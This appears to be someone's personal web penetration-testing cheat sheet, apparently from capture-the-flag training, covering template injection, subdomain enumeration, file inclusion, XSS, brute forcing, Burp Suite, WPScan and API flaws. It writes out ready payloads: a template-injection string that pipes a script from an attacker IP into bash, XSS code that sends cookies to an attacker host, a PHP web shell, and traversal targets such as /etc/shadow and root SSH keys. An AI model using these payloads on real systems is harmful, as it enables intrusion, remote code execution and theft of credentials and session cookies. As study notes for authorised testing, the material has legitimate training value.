- [Server Side Template Injection](#server-side-template-injection)
- [DNS - Subdmain](#dns---subdmain)
  - [Wildcards](#wildcards)
- [IDOR](#idor)
- [File inclusion](#file-inclusion)
- [SSRF](#ssrf)
- [XSS](#xss)
- [Websocket](#websocket)
- [Command injection](#command-injection)
- [Authentication](#authentication)
- [SQL Injections](#sql-injections)
  - [Steps](#steps)
  - [UNION](#union)
    - [Find data oracle](#find-data-oracle)
  - [blind](#blind)
    - [binary](#binary)
      - [sqlmap](#sqlmap)
      - [Provoking errors](#provoking-errors)
    - [Time](#time)
- [Burpsuite](#burpsuite)
  - [Repeater](#repeater)
  - [Intruder](#intruder)
  - [Macros](#macros)
  - [Decoder, Comparer, Sequencer](#decoder-comparer-sequencer)
- [Wordpres](#wordpres)
- [API](#api)
- [Git Enumeration](#git-enumeration)
- [PHP psy shell](#php-psy-shell)
- [PHP exec](#php-exec)


## Server Side Template Injection
{{7x7}}
#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('curl 10.9.1.255:5556/s.sh | bash')}()}
[SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)

## DNS - Subdmain
- search certificates: 
  - https://transparencyreport.google.com/https/overview
  - https://crt.sh/
    - $ curl -s "https://crt.sh/?q=%.<domain>&output=json" | jq '.[].name_value' | sed 's/\"//g' | sed 's/\*\.//g' | sort -u > hosts-crtsh.txt
    - curl -s https://certspotter.com/api/v0/certs\?domain\=$1 | jq '.[].dns_names[]' | sed 's/\"//g' | sed 's/\*\.//g' | sort -u > hosts-certspotter.txt
- Google search engine: site:*.domain.com
- dnsrecon
- dnsdumpster => online
- wfuzz
- ffuf
  - -u "$target" -H "Host: FUZZ.$target"

### Wildcards 
- A lot of false positive
- need to be filtered
- dig domain.de A,CNAME {test321123,testingforwildcard,plsdontgimmearesult}.<domain> +short | wc -l ===> > 1, a lot of false positive from brute force

- OWAPS *Amass*: amass -src -ip -active -brute -d
  - https://github.com/OWASP/Amass/blob/master/doc/tutorial.md
  - amass -passive -d domain.de -src
  - $ amass enum -active -d owasp.org -brute -w /root/dns_lists/deepmagic.com-top50kprefixes.txt -src -ip -dir amass4owasp -config /root/amass/config.ini -o amass_results_owasp.txt
  - https://medium.com/@noobhax/my-recon-process-dns-enumeration-d0e288f81a8a

- Create wordlist (from commands above)
  - sed 's/$/.<domain>/' subdomains-top1mil-20000.txt > hosts-wordlist.txt
  
## IDOR
Insecure Direct Object Request

## File inclusion
- insecure input validation
- path traversal: ../../../etc/passwd
- Important files
  - /etc/issue - system identification
  - /etc/profile - default variables terminal
  - /proc/version - kernen versel
  - /etc/shadow - users password
  - /root/.bash_history
  - /var/log/dmessage
  - /root/.ssh/id_rsa = private rsa key
  - /var/log/apache2/access.log
  - C:\boot.ini (windows)

- null byte = %00, injection (terminate string)
- curl -X METHOD -d [data]
  - -k ignore secure connection
  - -vvv
- magic numbers
- double extension
- exiftools -Comment=PAYLOAD picture.jgp.php ==> Comments!!!

## SSRF
- Server-Side Request Forgery
- Where? 
  - Full Paramter in the address bar ("value="http..../name")
  - partial URL
  - Blind: requestbin.com
  - ../ => directory trasversal
  - &x= ==> ignore everything that comes after that

## XSS
- Cross-Site Scripting
- test: parameters, URL File Path, HTTP Headers
- in js onload event within a tag
- Polyglot: jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
- Payload for shell: </textarea><script>fetch('http://{URL_OR_IP}?cookie=' + btoa(document.cookie) );</script>
-                    </textarea><script>fetch('http://10.8.80.130:1234?cookie=' + btoa(document.cookie) );</script> 

## Websocket
- Bidirectional
- Exploit message content
- Change "X-Forwarded-For" header
- Cross-site WebSockets
  - cross domain connection
  
## Command injection
- blind: no output, test with ping/sleep/timeout(win) || force output > etwas
  - curl http://website/command
- verbose: output/feedback
- $payload = "\x2f\x65\x74\x2f\x70\x61\x73\x73\x77\x64"

## Authentication
- Brute force: 
  - in Header ==> **X-Forwarded-For**: [IP] ==> avoid IP blocking
  - intercalate correct login AND brute force (intruder)

- Blocked account
  - enumerate username until valid one ==> NULL payload for password + several tries until get different response
  - try password with these usernames ==> grep warning for incorrect passwords

## Burpsuite

```
# Python code
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
```

### Repeater
- manipulate the request
- check response
- 
### Intruder
- brute force and fuzzing
- Positions: where to insert payload
- Attack types 
  - **sniper**: one set of payload (wordlist) / i.g. username/password
  - **battering ram**: same payload in every position
  - **pitchfork**: several sniper at the same time, one payload per position. For credentials
  - **Clusterbomb**: multiple payload, individual iteration, every combination

- Payload: define list file, regex or other condition
- Filtering results: 
  - status (200, 401, 302)
  - size: sucess 400 bytes, failed 600 bytes

- CSRF Token: 
  - token changed by every update of the page
  - define macros
  
### Macros
- Repeated actions
- project options + add + selection action to be done
- Session handling rule: select macro + select where to do it (intruder, repeater, target) + update only "name of the field", 

### Decoder, Comparer, Sequencer
- Decoder
  - Encode e decode data
  - hashsums, ASCII, binary, hexa, etc

- Comparer
  - compare data
  - compare responses after logins attempt

- Sequencer
  - measure entropy of tokens
  - analyze after an amount of tokens
  - Auto Analyze = capture every 2000 requests

## Wordpres
- wpscan
  - -v verbose
  - -o output
  - --enumerate
    - u = user
    - dbd = database
    - at = all theme
    - vt = vulnerable themes
    - p = popular plugins
    - ap = all plugings
    - vp = vulnerable pluging
    - tt = timthumbs
    - cb = config backups
  - -U username
  - -P password
  - --url

## API
- Identify response to different methods
- Fuzzing hidden endpoints
- 
- Identify swagger
- **BOLA - Broken Object Level Authorisation**
  - Deserialisation
  - endpoind/user/NUMBER
  - Identifiy who made request + authorization 
- **BUA - Broken User Authentication**
  - No token for authentication
  - poor encryption
- **Excessive Data Exposure**
  - The application tells more than it should
- **Lack of Resozrce & Rate Limiting**
  - DoS
  - A lot of requests
  - Mitigation: captcha, time between request
- **Broken Leval Authorisation**
- **Mass Assignment**
  - client-side date BOUND with server-side object
  - edit fixed/read-only fields, like ID/username
  - Solution: not bind input to variable automatically + allowlist of properties that can be updated
- **Security Misconfiguration**
  - error handling with full information
  - solution: no default username:password + no directory listing + set permisions for folder/files + turn off debugging 
- **Injection**
  - user input not filtered
  - solution: good libraries + validation of user input
- **Improper assets management**
  - access to deprecated/unpatched API calls
  - solution: block old api calls + Q&A R&D separated + documentation
- **Logging & Monitoring**
  - activities, request and all should be logged: endpoint, visitor's IP, input
  - solution: SIEM + alerts + see denied access/failed authentication/input validations/

## Git Enumeration
- nmap -sn ip.1-255 -oN output
- check error message in the http server
- explore folders
- find exploit
- dos2unix exploit.py OR sed -i 's/\r//' python.py
- correct the information on the exploit
- execute shell there
- execute with burp or curl
- curl -POST localhost:8000 ==> here we go to the computer we dont have access
- 
  
- Extract .git folder
- Gittools
  - dumper: downlaod exposed .git directory from site
  - extractor: take local .git and recreate repository
  - finder: search for exposed g.t
  - Read files: 
    - separator="======================================="; for i in $(ls); do printf "\n\n$separator\n\033[4;1m$i\033[0m\n$(cat $i/commit-meta.txt)\n"; done; printf "\n\n$separator\n\n\n"

## PHP psy shell
- Check folders
scandir("/")
- Check files
file_get_content("/path/to/file")
- write file
file_put_content("path/to/file", "content", FILE_APPEND)

phpinfo()
ls

## PHP exec
- [Very good](https://github.com/WhiteWinterWolf/wwwolf-php-webshell)
- upload file/code back.php
```
<?php echo shell_exec($_GET['c']);?>
```
- In browser: http://$target//back.php?c=dir
  - http://$target//back.php?c=[Create a shell from here](https://www.revshells.com/)
